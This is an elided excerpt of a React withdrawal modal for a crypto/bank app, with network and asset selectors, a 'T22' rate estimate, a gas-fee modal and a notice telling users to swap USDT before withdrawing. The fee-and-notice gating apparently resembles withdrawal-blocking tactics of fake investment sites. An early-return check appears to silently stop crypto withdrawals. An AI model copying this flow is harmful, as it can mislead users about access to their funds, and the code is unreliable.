...
//                         <>
//                             <div>
//                                 <label className="block text-xs font-medium text-gray-400 mb-1.5">Enter Wallet Address</label>
//                                 <input
//                                     type="text"
//                                     value={address}
...
//                             <div>
//                                 <label className="block text-xs font-medium text-gray-400 mb-1.5">Choose Network Type</label>
//                                 <div className="relative">
...
export default function WithdrawalModal({ isOpen, onClose }: WithdrawalModalProps) {
    ...
    const networks = {
        BNB: { name: 'BNB Smart Chain', symbol: 'BEP20' },
        ETH: { name: 'Ethereum', symbol: 'ERC20' }
    };

    const availableCoins = {
        'BNB': { supportedNetworks: ["BNB"] },
        'ETH': { supportedNetworks: ["ETH"] },
        'USDT': { supportedNetworks: ["BNB", "ETH"] },
        'USDC': { supportedNetworks: ["BNB", "ETH"] }
    };
    ...
    const handleSubmit = async (e: React.FormEvent) => {
        ...
        try {
            setWithdrawLoading(true)
            if (!bankName && !routingNumber ) return;
            let vvv = await fetch(`/api/withdrawal`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ...
                    bankName,
                    type: "send",
                    asset: selectedCoin, // Dynamic
                    network: selectedNetwork // Dynamic
                })
            });
    ...
    return (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 animate-fade-in">
            ...
            <div className="absolute bottom-0 left-0 right-0 w-full bg-[#0a0b0d] border-t border-[#0052FF]/30 rounded-t-[2rem] p-6 animate-slide-up text-white shadow-2xl pb-10">
                ...
                <div className="grid grid-cols-2 gap-3 mb-4">
                    <button onClick={() => setWithdrawalType('crypto')} className={`p-3 rounded-xl border transition-all flex flex-col items-center justify-center gap-1.5 ${withdrawalType === 'crypto' ? 'border-[#0052FF] bg-[#0052FF]/10 text-white' : 'border-white/5 bg-[#1E2025] hover:border-white/10 text-gray-400 hover:text-white'}`}>
                        <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=026" alt="Crypto" className="w-6 h-6 object-contain" />
                        <span className="font-medium text-xs">Crypto</span>
                        <span className="text-[10px] opacity-70">To wallet address</span>
                    </button>

                    <button onClick={() => setWithdrawalType('bank')} className={`p-3 rounded-xl border transition-all flex flex-col items-center justify-center gap-1.5 ${withdrawalType === 'bank' ? 'border-[#0052FF] bg-[#0052FF]/10 text-white' : 'border-white/5 bg-[#1E2025] hover:border-white/10 text-gray-400 hover:text-white'}`}>
                        <img src="https://hatscripts.github.io/circle-flags/flags/us.svg" alt="Bank" className="w-6 h-6 object-contain rounded-full" />
                        <span className="font-medium text-xs">Bank</span>
                        <span className="text-[10px] opacity-70">To bank account</span>
                    </button>
                ...
                <form onSubmit={handleSubmit} className="space-y-4">
                    ...
                    {withdrawalType === 'crypto' && (
                        <>
                            ...
                            <div>
                                ...
                                <div className="grid grid-cols-2 gap-2">
                                    {Object.keys(networks).map((net) => (
                                        <button key={net} type="button" onClick={() => setSelectedNetwork(net as any)} className={`py-2 rounded-xl border text-[10px] font-bold ${selectedNetwork === net ? 'border-[#0052FF] bg-[#0052FF]/10 text-white' : 'border-white/5 bg-[#1E2025] text-gray-500'}`}>{networks[net as keyof typeof networks].name}</button>
                                    ))}
                                </div>
                            </div>

                            {/* Simple Asset Selector */}
                            <div>
                                <label className="block text-xs font-medium text-gray-400 mb-1.5">Select Asset</label>
                                <div className="flex flex-wrap gap-2">
                                    {filteredAssets.map((coin) => (
                                        <button key={coin} type="button" onClick={() => setSelectedCoin(coin)} className={`px-4 py-2 rounded-xl border text-[10px] font-bold ${selectedCoin === coin ? 'border-[#0052FF] bg-[#0052FF]/10 text-white' : 'border-white/5 bg-[#1E2025] text-gray-500'}`}>{coin}</button>
                                    ))}
                                </div>
                            </div>
                            ...
                            <div>
                                ...
                                <input type="text" value={address} onChange={(e) => setAddress(e.target.value)} placeholder="0x..." className="w-full px-4 py-3 bg-[#1E2025] border border-white/5 rounded-xl focus:border-[#0052FF] focus:outline-none transition-colors text-white font-mono text-xs placeholder-gray-600" required />
                            </div>
                        </>
                    )}
                    ...
                    {withdrawalType === 'bank' && (
                        <>
                            ...
                            <div>
                                <label className="block text-xs font-medium text-gray-400 mb-1.5">Account Number</label>
                                <input type="text" value={accountNumber} onChange={(e) => setAccountNumber(e.target.value)} placeholder="Enter account number" className="w-full px-4 py-3 bg-[#1E2025] border border-white/5 rounded-xl focus:border-[#0052FF] focus:outline-none transition-colors text-white placeholder-gray-600 text-xs" required />
                            </div>
                        </>
                    )}
                      ...
                      <div>
                        <label className="block text-xs font-medium text-gray-400 mb-1.5">Enter Amount</label>
                        <div className="relative">
                            <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="0.00" className="w-full px-4 py-3 bg-[#1E2025] border border-white/5 rounded-xl focus:border-[#0052FF] focus:outline-none transition-colors text-white text-base placeholder-gray-600" required />
                            <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 font-medium text-xs">USD</span>
                        </div>
                        {withdrawalType === 'bank' && (
                            <div className="flex justify-end mt-1.5 text-[10px] text-gray-400">
                                {isLoadingPrice ? <span className="flex items-center gap-1"><Loader2 className="w-3 h-3 animate-spin" /> Fetching rate...</span> : <span>≈ {getEstimatedT22()} T22 (@ ${t22Price.toFixed(2)})</span>}
                            </div>
                        )}
                    </div>

                    <button disabled={withdrawLoading} type="submit" className="w-full bg-[#0052FF] hover:bg-[#004ada] text-white font-bold py-3 rounded-full transition-all shadow-lg hover:shadow-[#0052FF]/25 active:scale-[0.98] flex items-center justify-center gap-2 mt-4 text-sm">
                        {withdrawLoading ? "pending" : "Continue"}
                        <ArrowRight className="w-4 h-4" />
                    </button>
                </form>
                ...
                <p className="text-[10px] text-gray-500 text-center mt-5">
                    {withdrawalType === 'crypto' ? `Sent via ${networks[selectedNetwork].name} (${networks[selectedNetwork].symbol})` : 'Bank transfers typically take 1-3 business days'}
                </p>
            </div>

            <GasFeeModal isOpen={showGasModal} onClose={() => setShowGasModal(false)} onSuccess={handleGasSuccess} />
            <StatusModal success={false} message='Please swap your usdt before proceeding with withdrawals' title='Notice' isOpen={showStatusModel} onClose={() => { setShowStatusModel(false) }} />
        </div>
    );
}